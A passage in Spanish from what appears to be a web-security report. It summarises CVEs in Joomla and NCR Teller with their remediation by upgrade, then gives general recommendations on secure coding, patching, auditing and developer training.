7. **CVE-2022-23795 (Joomla)**: Esta vulnerabilidad crítica permitía a un atacante remoto eludir el proceso de autenticación y tomar el control de cuentas de usuario. La remediación consistió en actualizar a las versiones 4.1.2 o 3.10.8 de Joomla.
8. **CVE-2023-42362 (NCR Teller)**: Una vulnerabilidad de carga de archivos sin restricciones que conducía a scripts entre sitios almacenados (XSS). La solución fue actualizar a la última versión de la aplicación web NCR Teller.

## **Importancia de la Mitigación de Vulnerabilidades**

Las vulnerabilidades en aplicaciones web representan una amenaza significativa para la seguridad de los sistemas de información. Las inyecciones de código, fallos en la gestión de sesiones, y problemas de autenticación son vectores comunes de ataque que pueden comprometer gravemente la seguridad. La mitigación efectiva de estas vulnerabilidades requiere una combinación de buenas prácticas de desarrollo seguro, monitoreo continuo, y actualizaciones regulares.

# Recomendaciones

1. **Implementación de Controles de Seguridad**: Utilizar bibliotecas y marcos de seguridad como OWASP ESAPI, y adoptar prácticas de codificación segura para minimizar el riesgo de inyecciones y XSS.
2. **Actualización Continua**: Mantener todos los sistemas y aplicaciones actualizados con los últimos parches y versiones para protegerse contra vulnerabilidades conocidas.
3. **Monitoreo y Auditoría**: Realizar auditorías de seguridad periódicas y utilizar herramientas de escaneo de vulnerabilidades para identificar y remediar problemas de seguridad antes de que puedan ser explotados.
4. **Capacitación de Desarrolladores**: Invertir en la capacitación continua de los desarrolladores para que estén al tanto de las últimas amenazas y técnicas de mitigación en ciberseguridad
